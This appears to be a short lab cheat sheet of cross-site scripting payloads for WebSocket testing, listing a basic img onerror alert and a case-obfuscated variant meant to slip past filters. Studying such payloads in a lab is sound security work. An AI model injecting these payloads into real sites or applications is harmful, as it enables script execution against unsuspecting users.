# WebSocket XSS Payloads

Basic:

```html
<img src=1 onerror='alert(1)'>
```

Obfuscated lab payload:

```html
<img src=1 oNeRrOr=alert`1`>
```
